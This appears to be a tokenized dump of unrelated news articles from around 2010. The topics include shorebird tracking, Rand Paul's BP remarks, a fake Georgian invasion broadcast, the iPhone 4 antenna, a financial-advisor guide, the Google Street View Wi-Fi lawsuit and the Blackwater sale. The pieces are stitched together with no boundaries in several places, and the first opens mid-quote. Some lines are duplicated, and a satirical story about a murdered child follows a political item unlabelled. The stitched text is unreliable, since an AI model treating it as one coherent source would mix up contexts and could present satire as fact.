" Unfortunately , the size of the satellite transmitters , and the batteries required to power them , precluded their use on smaller shorebirds like ruddy turnstones , " said Dr Clive Minton from the AWSG .
" However , a different technology using a 1 gram light - sensor geolocator has enabled researchers to track the 27,000 kilometre round trip of ruddy turnstones from Australia to their Arctic breeding grounds and back via China on their way north and via Kiribati [ the Gilbert Islands ] on their return trip across the Pacific .
" This now opens up the possibility of tracking the migration routes of shorebirds as yet virtually unknown . "
The geotrackers created by scientists at BAS are extremely lightweight – the ones used on the turnstones are about 1 gram – which makes it possible to fit them to small birds without crippling them with extra weight .
Previously , light - sensitive trackers have been used on larger birds such as geese , albatross , penguins , and skuas , but further miniaturisation has enabled even small birds to be monitored .
One device recently released by BAS weighs just 0.8g and another under development is just 0.6g .
They work by recording how long daylight lasts each day which , when analysed back in the lab , allows researchers to pinpoint which part of the world the birds were in on each day of the year .
Data provided by the trackers offers researchers the chance to gather much more detailed information on the birds ' migration routes , including stop - offs for feeding , and their physical capabilities .
Discoveries made by such studies help scientists build up a complete picture of the needs of birds and other animals which can be used to help conserve them .
For the study of ruddy turnstones from south east Australia , six were fitted at Flinders and another two were fitted at Carpenter Rocks .
A year after being fitted scientists were able to retrive four devices , all at Flinders .
The fate of the four other birds is unknown .
Tracker devices can be fitted on birds either by fixing them to a leg or by sticking them to the back .
All the ruddy turnstone had them attached to legs because tests showed that after spending the Australasian summer fattening up to their maximum weight of about 190g they were " as round as tennis balls " and the backpack style would n't stay on .
Earlier this year , the results of a similar study on Arctic Terns fitted with miniaturised light - sensitive trackers revealed the long - distance birds took an ' S ' shaped route on the northwards journey as they traveled 44,000 miles between the poles each year
Scientists have been so impressed by the lightweight tracking devices that they are fitting them on many more birds this year to learn more about migration routes .
At least 60 ruddy turnstones , 30 greater sand plovers , Charadrius leschenaultii , and four sharp - tailed sandpipers , Calidris acuminata , are expected to be fitted with the geotrackers by the end of this month .
Flights of fancy : Record - breaking birds
Bartailed Godwit
A female made the longest recorded non-stop flight of 7,145 miles from Alaska to New Zealand .
Peregrine Falcon
With diving speeds in excess of 150 mph as it swoops down on prey , it is the fastest bird in the world .
Sooty Shearwater Recorded the longest migration with an annual journey of 46,000 miles , and travelled up to 680 miles a day .
Arctic Tern Tracking devices recently showed a bird making an annual migration flight of 41,000 miles .
Kentucky Republican Senate candidate Rand Paul , who drew wide attention this week for his reluctant embrace of the 1964 Civil Rights Act , said this morning that President Barack Obama ’s criticism of BP has sounded “ really un-American . ”
Speaking on ABC ’s “ Good Morning America , ” the libertarian iconoclast said the castigation of BP ’s response to the oil gusher on the floor of the Gulf of Mexico was an attack on business and part of the “ blame game , ” where tragedy is “ always someone ’s fault . ”
“ What I do n’t like from the president ’s administration is this sort of , ‘ I ’ll put my boot heel on the throat of BP . ’
I think that sounds really un-American in his criticism of business , ” he said .
“ I ’ve heard nothing from BP about not paying for the spill .
And I think it ’s part of this sort of blame game society in the sense that it ’s always got to be someone ’s fault instead of the fact that sometimes accidents happen . ”
Paul ’s overwhelming victory Tuesday over a Republican establishment candidate hand - picked by Senate Minority Leader Mitch McConnell ( R , Ky. ) is rapidly turning into a contest of ideas over the reach of government .
Jack Conway , the Kentucky attorney general and Paul ’s Democratic opponent for the Senate , said in an interview that Paul ’s problems stem from “ a narrow , rigid philosophy that government should n’t deal with businesses at all , ” which will create a series of blowups until November , he predicted .
In an interview with National Public Radio Wednesday , Paul expressed misgivings not just over the Civil Rights
Act ’s imposition of desegregation on private businesses but about the strictures of the Americans with Disabilities Act …

Georgia was thrown in panic overnight as fake report of a Russian attack was shown on the Imedi TV .
Imedi TV presented the report as an “ immitation of possible events ” but many viewers who missed the beginning failed to realize that it was fake .
The TV report said that Russian tanks entered the Georgian capital Tbilisi , and that President Mikhail Saakashvili had been killed , ITAR - TASS reported .
The Georgian Interior Ministry has pointed out that the report – which did not show any message that it was fake after the one at the beginning – created excessive panic in the Georgian population .
The proclaimed aim of the report was to remind the Georgians of the five - day war with Russia from August 2008 over South Ossetia when Russian forces were 45 km of the capital Tbilisi .
The report of the Imedi TV featured archive footage from the five - day war showing advancing Russian tanks .
The Imedi TV report fooled the Russian media as well , as Interfax announced of unconfirmed information that Russian tanks invaded Georgia and Saakishvili had been killed , and the Echo Moskvy Radio stopped its regular program in order to announce the fake news .
An anchor of Imedi TV has apologized for the panic the report might have created , saying , “ We just wanted to show what the most terrible day in Georgia ’s history could be like . ”
International media have remarked that the fake Russian invasion report is directed against opposition opponents of Georgian President Saakashvili who have called for restoring the diplomatic relations with Russia .
Boxing legend James " Lights Out " Toney and Strikeforce light heavyweight champion King Mo Lawal both confirmed to FightHype.com that they will be working together as Toney prepares for his MMA debut against UFC Hall of Famer Randy Couture .
The two actually already got some work in this weekend and will continue to train together as the fight gets closer .
Both men are looking at the opportunity as a win - win situation for both parties .
Lawal , being a decorated wrestler , can assist Toney in that department while at the same time improve his own striking skills by learning from one of the most accomplished boxers in the history of the sport .
Taking on Randy Couture could possibly be the toughest MMA debut that any fighter has been faced with , but Toney is preparing accordingly .
Bringing in Lawal is an indication of just how seriously he 's taking this fight and the sport .
The current Strikeforce light heavyweight champion also helped Antonio " Minotauro " Nogueira prepare for his UFC 102 bout with Couture , which he went on to win via unanimous decision in a " Fight of the Year " candidate .
UFC 118 will take place on Saturday , August 28th at the TD Garden Arena in Boston , Massachusetts .
CHECK BACK LATER FOR MUCH MORE TO COME FROM BOTH TONEY AND LAWAL

This is the weekly blog post from Bruce Nilles , Director of the Sierra Club 's Beyond Coal Campaign .
Be sure to join the Beyond Coal Group on Climate Crossroads .
Two reports released this week reveal that when it comes to the bottom line of state budgets , These reports are among the first to examine actual revenues and expenditures related to coal industry employment , taxes and subsidies in Tennessee and West Virginia .
Downstream Strategies produced the reports .
For Tennessee ( PDF ) , the report found that the coal industry contributed just over $ 1 million to the state budget - less than one - tenth of one percent of the state 's total revenue in 2009 .
That benefit was overwhelmed by the costs imposed by the industry , including state subsidies , regulation , road repair and mine reclamation costs .
Though coal brings in a bigger percentage of state revenues in West Virginia ( PDF ) , the end result matches that of Tennessee ;
" It should be no surprise - coal is not king in the West Virginia economy , even though our decision makers act as if it is , " said Jim Sconyers , chair of the West Virginia Sierra Club .
" It is a total outrage that the long - suffering West Virginia taxpayer is forced to pay millions of dollars so the filthy rich coal companies can destroy our roads , mountains and communities .
" And so we learn that even beyond the human and environmental health damage the coal industry does , the economic damage is there as well .
More reports like these are coming , and one has already been done on Kentucky .
( PDF ) We know Tennessee and West Virginia , and all the other states where Big Coal is trying to be king , can do better with clean energy .

They told Engadget , and our own reader Jason :
Gripping any mobile phone will result in some attenuation of its antenna performance , with certain places being worse than others depending on the placement of the antennas .
This is a fact of life for every wireless phone .
If you ever experience this on your iPhone 4 , avoid gripping it in the lower left corner in a way that covers both sides of the black strip in the metal band , or simply use one of many available cases .

In essence , do n't hold it that way .
Or , use a case .
Both pretty horrible solutions to what is evidently a hardware problem .
Meaning they probably can't fix this with a software update , or else Apple 's statement would have included an item about their engineers working on the issue , and saying there will be a fix soon .
Are they going to give out free cases so users can hold their phone in the way that feels natural ?
Like every other phone ?
Probably not .
This is a change in their attitude from just yesterday , where Steve Jobs personally responded to Reader Lucas saying that " it 's not a big issue . "
I do n't see how an issue that was reproduced by just about all our staff , and many ( not all , but many ) people on the internet , is not a big issue .
But apparently Apple agreed , which is why they changed their public line to what they 've just issued .
He also emailed Reader Matt back earlier today with this response :
You are in a marginal cell area .
It has nothing to do with the phone .
Reader Aram also submits this screenshot of his alleged conversation with Steve Jobs from a bit later in the day ( today ) .
If the email is legit , it shows the change in attitude from " it 's not a big issue " to " it is an issue , but just do n't hold it like that . "

Update : Reader Adam reminds us of this FaceTime video made by Apple .
When people in that video are holding their phones vertically , they 're holding it in the wrong way .
You know , the way that kills reception .
But when they 're holding it vertically , they 're strangely holding it with the left hand on the top of the phone and not the bottom .
So that it 's more likely their hand will get in the way of the camera .
Weird that they 're holding it that way .

Here 's how we make money
The world of investing and financial planning can be confusing .
If you ’ve heard about certified financial advisors , you may be wondering exactly what do they do and whether or not you need one .
Even as a CPA myself , I ’ve found this world a bit confusing .
But I spoke with some friends who are advisors , did my own research with an advisor session , and I ’m here to share what I learned with you .
A financial planner can do anything from managing your investments to giving your finances a total overhaul .
Different financial planners get paid in different ways .
Some charge a percentage of the assets they manage , typically 1 - 2 % .
Others get paid by the hour , often $ 150 to $ 300 per hour .
What is a Financial Advisor ?
The term “ financial advisor ” is a broad one that can refer to many different types of people or services that help people manage their money and reach their financial goals .
When it comes to giving financial advice , anyone can choose to do without getting any particular certification .
But to actually sell investment products , financial advisors must pass a series of tests .
Financial advisors who have completed all the required testing can become broker - agents or registered investment advisors .
We ’ll discuss how broker - agents and Registered Investment Advisors are different under the “ What is a Fiduciary Financial Advisor ” section .
What is a Certified Financial Advisor ?
Technically , there is no such thing as a “ Certified Financial Advisor . ”
But Certified Financial Planners ( CFPs ) definitely are a thing .
While all CFPs are financial advisors , not all financial advisors are CFPs .
To become a CFP , you must submit yourself to a grueling education process that includes several courses and a killer exam .
Once the education requirement to become a CFP has been satisfied , three years of full - time personal financial planning experience or two years of apprenticeship experience must be completed before an advisor can receive the CFP designation .
When I interviewed Jeff Rose , a CFP himself and founder of Good Financial Cents , he talked about how intense and difficult it was to become a CFP .
The process that I went through to become a Certified Financial Planner™ professional was one of the hardest times of my life .
But he also says that the time , effort , and financial sacrifice that it took to become a CFP earned him a lot of credibility .
“ Almost anyone in our industry can become a financial advisor , but taking the extra time and effort to become a CFP ® has earned the respect from my peers and also my clients . ”
Finally , the Certified Financial Planner board requires all CFPs to complete 30 credit hours of continuing education every two years so that they can stay well - versed in comprehensive financial planning .
What is a Fiduciary Financial Advisor ?
A fiduciary financial advisor is someone who is required to act in the best interest of their clients .
While you would n’t be crazy to expect that all financial advisors would have this requirement , unfortunately , they do n’t .
Many financial advisors are only bound to a “ suitability ” requirement , which means that they can only make investment suggestions that meet a client ’s age , risk tolerance , and financial circumstances .
Fiduciary advisors , on the other hand , are held to a much higher standard .
They must always put the interest of the client ’s above their own .
That means if a particular investment product or strategy is best for the client , they must recommend it even if it means less money ( or none at all ) in their own pocket .
How can you find a fiduciary financial advisor ?
This is where the distinction between a regular broker - agent and a Registered Investment Advisor ( RIA ) comes into play .
RIAs are required by law to act as fiduciaries for their clients , whereas broker - agents are not .
And in the CFP Board Code of Ethics , they require all CFPs to act as fiduciaries as well .
What is a Fee -Only Financial Advisor ?
There are three main categories of financial advisors :
Commission :
These types of advisors make all their money from the commissions that they earn on investment product sales .
: These types of advisors make all their money from the commissions that they earn on investment product sales .
Fee - Based :
These types of advisors charge some sort of flat fee for their services , but may also earn on commissions on product sales .
: These types of advisors charge some sort of flat fee for their services , but may also earn on commissions on product sales .
Fee -Only :
These types of advisors cannot earn any commission from product sales .
As the name aptly suggests , the fee is their only source of income .
Since fee - only financial planners do n’t receive any commissions , many believe this removes nearly all potential conflict of interest .
They are paid to give you good advice .
Period .
And if you are n’t happy with their services , you can always go find another fee - only planner who serves you better .
For this reason , the interests of the client and the fee - only financial planner are usually closely aligned .
Later on in this article , I ’ll talk about my first experience sitting down with John , a CFP at Frisco Financial Planning .
When I met with John , I asked him what my readers should look for in a financial advisor .
A Certified Financial Planner Professional with several ( at least 10 ) years of experience .
Not employed by a large financial institution ( bank , brokerage fund , or life insurance company ) .
Fee-only ( paid directly by the client and receives no commission ) .
I could n’t agree more with John .
By just following these three guidelines you will have a great chance of finding a wonderful financial advisor who only acts in your best interests .
What do Financial Advisors do ?
When I interviewed Jeff Rose , I asked him what kinds of services he tends to provide for his clients .
Here ’s what he had to say :
“ … Most people that come to me need a game plan for a successful retirement .
They rely on me to analyze their situation and develop a plan of attack that does two things :
1 . Satisfies the goals they are trying to accomplish 2 .
Does so in a fashion that they understand and are completely comfortable with . ”
In this section , it ’s important to explain a key difference between CFPs and Registered Investment Advisors ( RIAs ) .
To use a baseball analogy , CFPs are like utility players .
They help clients put together a plan that encompasses their entire financial landscape , including the entire financial picture , including insurance , taxes , and estate planning .
RIAs , on the other hand , are like a lefty bullpen pitcher .
They ’re specialists .
RIAs only give advice on investments and are highly trained to do so .
For this reason , some people ( especially wealthier clients ) choose to work with both a CFP and an RIA in tandem .
If you ’re just looking for someone to give you investment recommendations , an RIA would be a fine choice .
But if you like the idea of having someone in your corner who ’s keeping an eye on every aspect of your financial situation , then you ’re going to want to find a CFP .
How Much do Financial Advisors Cost ?
When it comes to fee - only financial advisors , there are three main types of fee structures .
Assets Under Management ( AUM )
This is one of the most common fee structures for fee - only advisors .
Their fee is simply a percentage ( often around 1 % ) of the assets that are being managed for the client .
So if the client ’s portfolio is $ 500,000 , then the fee would be $ 5,000 .
It ’s important to note , though , that these types of advisors often have account minimums , such as $ 250,000 .
Accounts with smaller balances are often just not worth their time .
It ’s also important to note that their fee is taken out of your investment , which reduces the amount available to grow .
This is even a bigger issue if all your investments are in retirement accounts since they have caps .
If you invest $ 6,000 in your Roth ( the annual cap as of 2019 ) and the advisor takes a fee of $ 2,000 , that effectively reduces your maximum annual investment to $ 4,000 .
Flat Retainer Fee
Other fee - only financial advisors charge a flat retainer that is not linked to account size .
There are many companies that use the flat retainer pricing model .
Below , are a couple of interesting companies that you may want to look more in to .
Facet Wealth
Facet Wealth connects clients with fiduciary - bound CFP professionals .
They reject the AUM model because they think you should pay for service rather than pay based on how much money you have .
They also realize that your account size is n’t necessarily indicative of how much time you ’ll need to spend with a CFP .
For this reason , Facet Wealth only charges for the specific services that you use .
Their flat retainer fee can range from $ 480 to $ 5,000 per year .
SmartAsset
SmartAsset is a free service that allows people to find the right financial advisor .
The process is relatively simple .
Answers a set of questions , get a list of financial advisors that match your needs and book an appointment .
They make money charging a referral fee to advisors signed up through their service .
There is no cost to you .
Questions range from “ How do you currently manage your money ? ” to “ How important is it for your financial advisor to have tax expertise ? ”
Answers questions about your current finances , your family makeup , and what you ’re looking for in a financial advisor .
SmartAsset will provide you with matches based on your answers .
You have the choice of local financial advisors or not , depending on preference .
They also provide advice and tools to help with decisions on home buying , taxes , banking , credit cards , and more .
If you are looking for help finding a good financial planner , but do n’t want to pay any finder fees , SmartAsset could be a good option .

Hourly Fee
Do all these pricing options still sound too expensive for you ?
If so , there ’s one final option you may want to consider .
Some financial advisors allow you to pay by the hour for their advice .
Expect to pay from $ 150 to $ 300 an hour for their services .
Why Meet with a Financial Advisor
When I met with John from Frisco Financial Planning , I wanted to find out which kinds of people tend to seek out his services .
“ … A majority of my client base , I ’m estimating 80 % or greater , is of the baby boomer generation .
Most of my clients have worked in some industry or trade for a number of years and now they ’re inching closer to retirement . ”
I also asked John to describe his typical client .
He said that his services were cost - effective for people with no consumer debt , who were already saving at least 10 % of their income , and who make over $ 150,000 a year and / or have $ 250,000 saved already for retirement . ”

Financial Advisor Alternatives
To find a good financial advisor alternative , you first need to identify your needs .
If you ’re looking to get a full financial plan laid out , talking to a human CFP may honestly be your best move .
But if you ’re only looking for help with picking investment products or optimizing your asset allocation , you may be able to get the service you need from a robo- advisor , like M1 Finance .
Pricing for robo-advisors tend to start at around 0.25 % of assets under management .
Some robo-advisors even offer plans that include access to financial advisors when needed .
But you ’ll typically have to pay a higher percentage to get access to these plans and they may have account minimums .

My Meeting with a Certified Fee-Only Financial Advisor
On a Fox Business segment , I was asked what investments people could trust in these tough economic times .
I somewhat skirted the question and said that everyone should seek the advice of a fee - only financial planner , specifically a Certified Financial Planner ( CFP ) , to help them sort out where they are and what they need to do to get prepared for retirement .
But , afterward , I felt guilty that I ’d never taken my own advice .
I ’d never been to see a CFP .
Most of my retirement investing advice had come from books , blogs , and employer retirement plan administrators .
That was about to end .
I decided I needed to go visit a local CFP .
That ’s when I set up an appointment with John Gay , of Frisco Financial Planning .
Prior to our meeting , John sent us our full planning report , which contained :
Asset Allocation and Investments
Risk Tolerance
Lifetime Income Planning
College Education Funding
Appendix ( fund recommendations , life insurance information , and general info )
Once I arrived at John ’s office , our first order of business was to review the individual risk tolerance scores for me and Mrs. PT .
Our Risk Tolerance
We had each taken a risk profile assessment to evaluate our risk tolerance .
The assessment was around 25 or so questions .
John revealed our scores and also went over some of the questions where Mrs. PT and I disagreed the most .
As you can see by the charts below , I scored in the average range ( 52 ) , whereas Mrs. PT scored very low ( 30 ) with regard to risk tolerance .
I knew she was conservative .
But man , did I underestimate by how much !
Looking back on the survey , Mrs. PT said that there were some financial terms and concepts that she did n’t fully understand while taking the survey and that this may have affected her results slightly .
However , she stands by her conservative stance and feels like the survey had a needed effect on our allocation .
The software that John used took our combined risk tolerance scores and created an asset allocation that aligns with our feelings toward investment risk .
Here are the results :
Proposed Asset Allocation
A simpler way to present this would be to say that we should be investing 60 % in stocks , 30 % in bonds , and 10 % in cash equivalents .
So where are we right now ?
Well , our current asset allocation is far more aggressive than this .
We have most of our retirement assets in stocks , with under 10 % in bonds .
Our biggest fund is the Vanguard Target Retirement 2040 Fund ( VFORX ) , which has the following allocation :
Most of our other funds are stock - only index funds .
Our total current allocation across all funds is probably somewhere around 93 % stocks , 7 % bonds .
That ’s a far cry from the allocation proposed .
What this tells you is that I ’ve been making most of the retirement investing choices without much regard for Mrs. PT .
It appears as though I have some adjustments to make so that our investments reflect our risk tolerance .
Recommended Funds
John then went on to suggest some funds for us to achieve the proper allocation ( John loves the ETF ) :
Large Cap Stock Fund : SPDR S&P 500 ETF ( SPY )
: SPDR S&P 500 ETF ( SPY ) Small Cap Stock Fund : Vanguard Small Cap ETF ( VB )
: Vanguard Small Cap ETF ( VB ) International Stock Fund : Vanguard Europe Pacific ETF
: Vanguard Europe Pacific ETF Taxable Bond Fund : Vanguard Total Bond Market ETF ( BND )
: Vanguard Total Bond Market ETF ( BND ) Inflation - Indexed Bond Fund : Barclays TIPS Bond ETF ( TIP )
: Barclays TIPS Bond ETF ( TIP ) Municipal Bond Fund : ishares S&P Natl . Muni Bond ETF ( MUB ) , SPDR Barclays Short - Term Muni Bond ETF ( SHM )
: ishares S&P Natl . Muni Bond ETF ( MUB ) , SPDR Barclays Short - Term Muni Bond ETF ( SHM ) Real Estate ( REIT ) Fund : ( VEA ) Vanguard REIT ETF ( VNQ )
: ( VEA ) Vanguard REIT ETF ( VNQ ) Energy / Commodities Fund : Vanguard Energy ETF ( VDE )
: Vanguard Energy ETF ( VDE ) Cash Equivalent Funds : Taxable Treasury Money Market Fund , SPDR Barclays Capital 1 - 3 mo T - Bill ETF ( BIL )
John said that for each of our investment accounts that are over $ 10,000 ( in our case , a Rollover IRA ) we should shoot to have these investments .
For the accounts at or below 10 K ( our Roth IRAs , a Traditional IRA , and some misc. funds ) we should just pick a Vanguard Target Retirement Fund that mirrors the 60/30/10 allocation .

Other Information
John ’s session included a discussion of life insurance and college education funding for our kids .
I ’ll save that info for another post , but I can tell you that John was spot on with his recommendations for term life insurance and 529 college savings plans .
Finally , John stressed the need to build our emergency fund to a level more suitable for a self - employed , sole breadwinner .
Basically , we need to do all we can to build up a bigger cash cushion before we progress much further in our retirement investments .
I could n’t agree more .
Right now we have around six months worth of living expenses saved up .
He suggested up to 18 months worth .
It ’s hard for me to ever argue against a bigger emergency fund .

Conclusion :
Overall , I ’m glad that I met with John .
I left more confident about our financial future and Mrs. PT and I now have a better grip on how to direct future investments .
You may find similar value in speaking with a financial advisor as well .
But it ’s important to never stop self - learning about ways to save and invest more wisely .
No one , not even a fiduciary CFP , will ever be as passionate about your personal financial goals as you are .
Consider using SmartAsset to find a financial advisor .

Call for ' right to roam ' to help recession - hit towns
Hundreds of miles of disused railway track could be brought back into use Creating new public spaces from disused railway lines and forgotten canals could help regenerate urban areas hit by the recession , a think tank says .
Demos wants the " right to roam " - introduced 10 years ago to open up the UK countryside - to be extended to towns and cities .
It says support should be given to communities to help them use such sites for leisure and events like festivals .
British Waterways , which manages docks , rivers and canals , is backing the call .
Demos says that , with spending cuts likely to reduce the number of new publicly - funded developments , effort should be made to bring existing heritage sites back into use .
This could help physically regenerate run-down urban areas , renew a sense of local community , and fit well with Prime Minister David Cameron 's idea of the Big Society , the think tank adds .
Health and safety Co-author of the Resilient Places report Samuel Jones said : " Urban infrastructure like canals and old railway lines is the foundation of strong , vibrant communities .
" But ordinary people wo n't be able to really be part of this society without the access , and freedom , to make the communities their own . "
Demos is asking the coalition government to remove obstacles that could prevent communities using these spaces , such as health and safety regulations .
Communities across Britain now use their canals , rivers and towpaths in ways that their original builders could never have foreseen
Robin Evans , British Waterways
It wants free legal aid and advice to be available to individuals and groups to help them organise local festivals or sports days on the sites .
The report cites a number of success stories , such as the High Line , a disused railway track in New York , which has attracted 25,000 visitors a day since it reopened in 2009 as an elevated park .
In the UK , Brighton has opened up its 482 miles of sewers for visitor tours .
In Birmingham , redevelopment of the city 's canals has boosted civic pride and created new space for business and leisure .
Robin Evans , chief executive of British Waterways , said : " Forty years ago we tore down the fences that prevented local people from using and enjoying their waterways .
The results have been astonishing .
" Communities across Britain now use their canals , rivers and towpaths in ways that their original builders could never have foreseen .
" We now want to go further by removing the remaining obstacles which bar people from taking a greater role in their local waterways . "

WASHINGTON ( Reuters ) - President Barack Obama has directed the U.S. military to coordinate with South Korea to “ ensure readiness ” and deter future aggression from North Korea , the White House said on Monday .

The United States gave strong backing to plans by South Korean President Lee Myung - bak to punish North Korea for sinking one of its naval ships , White House spokesman Robert Gibbs said in a statement .
The White House urged North Korea to apologize and change its behavior , he said .
“ We endorse President Lee ’s demand that North Korea immediately apologize and punish those responsible for the attack , and , most importantly , stop its belligerent and threatening behavior , ” Gibbs said .
“ U.S. support for South Korea ’s defense is unequivocal , and the president has directed his military commanders to coordinate closely with their Republic of Korea counterparts to ensure readiness and to deter future aggression , ” he said .
Obama and Lee have agreed to meet at the G20 summit in Canada next month , he said .
Late last week , a team of international investigators accused North Korea of torpedoing the Cheonan corvette in March , killing 46 sailors in one of the deadliest clashes between the two since the 1950 - 53 Korean War .
Lee said on Monday South Korea would bring the issue before the U.N. , whose past sanctions have damaged the already ruined North Korean economy .
The United States still has about 28,000 troops in South Korea to provide military support .
The two Koreas , still technically at war , have more than 1 million troops near their border .
“ We will build on an already strong foundation of excellent cooperation between our militaries and explore further enhancements to our joint posture on the Peninsula as part of our ongoing dialogue , ” Gibbs said .
Gibbs said the United States supported Lee ’s plans to bring the issue to the United Nations Security Council and would work with allies to “ reduce the threat that North Korea poses to regional stability . ”
Obama had also directed U.S. agencies to evaluate existing policies toward North Korea .
“ This review is aimed at ensuring that we have adequate measures in place and to identify areas where adjustments would be appropriate , ” he said .

Google 's secret Wi -Fi sniffing has prompted a class - action lawsuit that could force the company to pay up to $ 10,000 for each time it snatched data from unprotected hotspots , court documents show .
The lawsuit , which was filed by an Oregon woman and a Washington man in a Portland , Ore. federal court on Monday , accused Google of violating Federal privacy and data acquisition laws .
" When Google created its data collection systems on its GSV [ Google Street View ] vehicles , it included wireless packet sniffers that , in addition to collecting the user 's unique or chosen Wi -Fi network name ( SSID information ) , the unique number given to the user 's hardware used to broadcast a user 's Wi-Fi signal ( MAC address , the GSV data collection systems also collected data consisting of all or part of any documents , e-mails , video , audio , and VoIP information being sent over the network by the user [ payload data ] , " the lawsuit stated .
On Tuesday , the same plaintiffs filed a motion for a temporary restraining order to prevent Google from deleting the data , a move the company has said it would make " as soon possible . "
Oral arguments on the restraining order are scheduled for Monday before U.S. District Court Judge Janice Stewart .
Google acknowledged the privacy problem last Friday , but said it had not known it was collecting data from unprotected wireless networks until recently .
" In 2006 , an engineer working on an experimental Wi-Fi project wrote a piece of code that sampled all categories of publicly broadcast Wi - Fi data , " said Alan Eustace , the head of Google 's engineering and research , in a blog post last week .
" A year later , when our mobile team started a project to collect basic Wi -Fi network data like SSID information and MAC addresses using Google 's Street View cars , they included that code in their software -- although the project leaders did not want , and had no intention of using , payload data , " Eustace wrote .
The blunder was discovered when Google audited the Street View Wi-Fi data after a request by Hamburg , Germany , data protection authorities .
Google has since stopped the Street View Wi -Fi sniffing , and wants to delete the data .
The two plaintiffs , Vicki Van Valin of Oregon and Neil Mertz of Washington , said that their homes ' wireless networks were not password protected , and that Street View vehicles had cruised by their residences at least once .
" Van Valin works in a high technology field , and works from her home over her Internet - connected computer a substantial amount of time , " the complaint read .
" In connection with her work and home life , Van Valin transmits and receives a substantial amount of data from and to her computer over her wireless network .
A significant amount of the wireless data is also subject to her employer 's non-disclosure and security regulations . "
Elsewhere in the lawsuit , the pair said they had transmitted other confidential information over their unprotected Wi -Fi networks , including credit card and banking data , and personal information including Social Security numbers .
Van Valin also used her wireless network for VoIP ( voice over Internet protocol ] telephone calls .
The lawsuit seeks class - action status , which would open the case to a pool of plaintiffs potentially in the millions .
Van Valin and Mertz asked that Google pay both statutory and punitive damages .
The former is set as the greater of $ 100 for each day any plaintiff or class member 's data was grabbed by Google , or $ 10,000 per violation suffered by each plaintiff or class member .
Google faces other legal actions over the Street View snafu .
German prosecutors , for example , have launched a criminal investigation into Google 's actions , while in the U.S. , the Federal Trade Commission ( FTC ) has been asked to investigate Google by the consumer group Consumer Watchdog .
Google said today that it would not comment on the lawsuit .

The security firm formerly known as Blackwater is looking for new ownership , announcing Monday it is pursuing a sale of the company that became renowned and reviled for its involvement with the U.S. government in Iraq and elsewhere .
The Moyock , N.C. - based company now called Xe Services announced its decision in a brief statement that gave few details .
“ Xe ’s new management team has made significant changes and improvements to the company over the last 15 months , which have enabled the company to better serve the U.S. government and other customers , and will deliver additional value to a purchaser , ” the statement said .
ADVERTISEMENT
Owner and founder Erik Prince said selling the company is a difficult decision , but constant criticsm of Xe helped him make up his mind .
“ Performance does n’t matter in Washington , just politics , ” Prince said in a further statement .
The private company became famous as Blackwater , which provided guards and services to the U.S. government in Iraq , Afghanistan and elsewhere .
It became one of the most respected defense contractors in the world , but also attracted sharp criticism over its role in those missions .
It has been trying to rehabilitate its image since a 2007 shooting in Baghdad that killed 17 people , outraged the Iraqi government and led to federal charges against several Blackwater guards .
The accusations later were thrown out of court after a judge found prosecutors mishandled evidence .
In March , Senate Armed Services Committee Chairman Carl Levin suggested the Pentagon should consider banning Xe from a $ 1 billion deal to train Afghan police .
The Michigan Democrat said he thought the company ’s involvement was hindering the U.S. mission in Afghanistan .

Prince , who founded the company in 1997 along with former colleagues from the Navy SEALs , said he does not anticipate having any role in Xe after the sale .
The process of finding a buyer and completing the deal is expected to take several months , according to spokeswoman Stacy DeLuke .
The announcement comes less than three months after Xe sold its aviation division for $ 200 million to Wood Dale , Ill . - based AAR Corp in a bid to strengthen Xe ’s balance sheet .

More recently , five former executives , including Gary Jackson , the company ’s ex-president , were indicted on charges of conspiring to violate federal firearms laws .
Jackson was among the top officials who left the company last year in a management shakeup .
After losing the Connecticut GOP endorsement at the state convention on Friday to Linda McMahon , most people presumed that former Congressman Rob Simmons would fight on to the primary .
Peter Schiff had already pledged primary fight , and Simmons hinted to me on Thursday that the convention would n’t settle anything .
Now , however , the Connecticut Mirror reports that Simmons has told his staff that he will withdraw from the race :
A Republican source says Rob Simmons told his staff Monday he will end his campaign for U.S. Senate at a press conference today in New London .
On Monday night , Simmons called a press conference for 9 a.m. in New London to make an “ announcement on the future of the campaign for U.S. Senate , ” immediately prompting speculation he was dropping out . …
But a source who declined to be identified said that Simmons staff was told the campaign was ending , bowing to the difficulties of fighting the best - financed candidate in Connecticut history : McMahon , a co-founder of World Wrestling Entertainment who is seeking office for the first time .
McMahon , who had contributed $ 16 million to her campaign by May 1 , is on pace to break all campaign spending records in the state by the Fourth of July .
She says she has budgeted $ 50 million of her personal fortune in an effort to become the first Connecticut Republican to win a Senate race since Lowell P. Weicker Jr. in 1982 .
Simmons , a former three - term congressman and decorated Vietnam veteran , hoped that delegates to the Republican State Convention last weekend would judge him the best opponent to face Democrat Richard Blumenthal , who has been on the defensive for the past week over his misrepresentation of his military record .
We ’ll know more later this morning .
It may be that Simmons saw too much of an uphill battle in fighting a candidate with a bottomless checkbook and the party endorsement going into the primary .
According to the Mirror , Simmons had an opportunity to switch candidacies a few weeks ago in order to avoid that confrontation , with Republicans urging him to seek his old seat in the House instead of fighting for the Senate seat .
Simmons thought that his military experience would trump McMahon ’s self - funding and outsider status , especially after Richard Blumenthal ’s exposure as a military - service fabulist .
If Simmons drops out , Schiff is out of luck .
He did n’t win enough votes at the convention to force a primary , where it takes 15 % of the ballots to allow for a primary fight .
He could file petitions to attempt to qualify for a primary , but he only has a couple of weeks to do so — and Schiff will have even less standing than Simmons in a primary fight , thanks to his poor convention showing , and he ’d face the same self - funding buzz saw .
Schiff has been a favorite of fiscal - conservative activists around the country , but it has n’t translated to support in Connecticut .
Schiff needed Simmons to demand a primary in order to guarantee one .
By the end of the day , Linda McMahon probably will have the nomination , if the Mirror has reliable sourcing on this story .
CASPER , WY — The people of America remained unmoved Monday as the sparse , barely attended funeral procession of Edith Pelphrey made its way to Pinelawn Cemetery in downtown Casper .
The recent murder of clumsy , unattractive , 6 - year - old Edith Pelphrey , pictured above in happier times , has not sent shockwaves of grief and despair rippling through the nation .

Edith , a homely six - year - old with thick glasses and a decidedly non-winning smile , was laid to rest largely as she had lived — unnoticed by the general population .
Discovered strangled with a length of nylon cord on Jan. 4 , reported to the police Jan. 15 , and finally investigated two days ago , the story of unattractive little Edith and her savage killing has failed to tug at America 's heartstrings .

To the few who knew her , Edith was an unattractive , awkward little girl who failed to stand out among her first - grade classmates at Jefferson Elementary School .
And it is this lack of social grace , more than anything , that makes her all - too - brief life — and its all - too - brief ending — all the more not - compelling and non-poignant in the eyes of a city and a nation .
The normally lively streets of Casper were quiet today .
Not because the city was mourning a loss that had shaken it to its core , but because of the capacity crowds attending this weekend 's 1997 " Li'l Miss Casper " pre-teen beauty pageant , a contest that Edith , had she lived , surely could never have entered , let alone won .

